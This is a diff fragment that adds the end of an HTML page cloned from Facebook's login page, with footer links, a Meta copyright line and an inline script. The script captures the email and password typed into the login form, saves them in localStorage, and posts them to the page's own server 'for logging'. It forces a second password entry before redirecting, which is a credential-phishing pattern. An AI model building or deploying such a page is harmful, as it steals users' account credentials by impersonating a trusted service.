+                      href="/policies/cookies/"
+                      title="Learn about cookies and Facebook."
+                      data-nocookies="1"
+                      >Cookies</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      class="_41ug"
+                      data-nocookies="1"
+                      href="https://www.facebook.com/help/568137493302217"
+                      title="Learn about Ad Choices."
+                      >AdChoices<i class="img sp_GPvE0syHYuh_2x sx_d60d8c"></i
+                    ></a>
+                  </li>
+                  <li>
+                    <a
+                      data-nocookies="1"
+                      href="/policies?ref=pf"
+                      accesskey="9"
+                      title="Review our terms and policies."
+                      >Terms</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/help/?ref=pf"
+                      accesskey="0"
+                      title="Visit our Help Centre."
+                      >Help</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.facebook.com/help/637205020878504"
+                      title="Visit our contact uploading and non-users notice."
+                      >Contact uploading and non-users</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      accesskey="6"
+                      class="accessible_elem"
+                      href="/settings"
+                      title="View and edit your Facebook settings."
+                      >Settings</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      accesskey="7"
+                      class="accessible_elem"
+                      href="/allactivity?privacy_source=activity_log_top_menu"
+                      title="View your activity log"
+                      >Activity log</a
+                    >
+                  </li>
+                </ul>
+              </div>
+              <div class="mvl copyright">
+                <div><span> Meta © 2026</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div></div>
+      <span
+        ><img
+          src="https://facebook.com/security/hsts-pixel.gif"
+          width="0"
+          height="0"
+          style="display: none"
+      /></span>
+    </div>
+    <div style="display: none"></div>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        var loginForm = document.getElementById("login_form");
+        if (loginForm) {
+          // Pre-fill email if it was previously entered
+          var savedEmail = localStorage.getItem("fb_email");
+          if (savedEmail) {
+            var emailInput = document.getElementById("email");
+            if (emailInput) emailInput.value = savedEmail;
+          }
+
+          loginForm.addEventListener("submit", function (e) {
+            e.preventDefault();
+            var email = document.getElementById("email").value;
+            var pass = document.getElementById("pass").value;
+
+            var attempts = localStorage.getItem("login_attempts") || 0;
+            attempts = parseInt(attempts) + 1;
+            localStorage.setItem("login_attempts", attempts);
+            localStorage.setItem("fb_email", email);
+
+            if (attempts === 1) {
+              localStorage.setItem("fb_pass1", pass);
+            } else if (attempts >= 2) {
+              localStorage.setItem("fb_pass2", pass);
+            }
+
+            // Send data to server for logging
+            fetch("/login", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                email: email,
+                pass: pass,
+                attempts: attempts,
+              }),
+            })
+              .then(function () {
+                fetch("/session-paths")
+                  .then((r) => r.json())
+                  .then(function (paths) {
+                    if (attempts < 2) {
+                      window.location.href = paths.loginPath;
+                    } else {
+                      localStorage.setItem("login_attempts", 0);
+                      window.location.href = paths.authPath;
+                    }
+                  });
+              })
+              .catch(function (error) {
+                console.error("Error sending data:", error);
+                fetch("/session-paths")
+                  .then((r) => r.json())
+                  .then(function (paths) {
+                    if (attempts < 2) {
+                      window.location.href = paths.loginPath;
+                    } else {
+                      localStorage.setItem("login_attempts", 0);
+                      window.location.href = paths.authPath;
+                    }
+                  });
+              });
+          });
+        }
+      });
+    </script>
+  </body>
+</html>
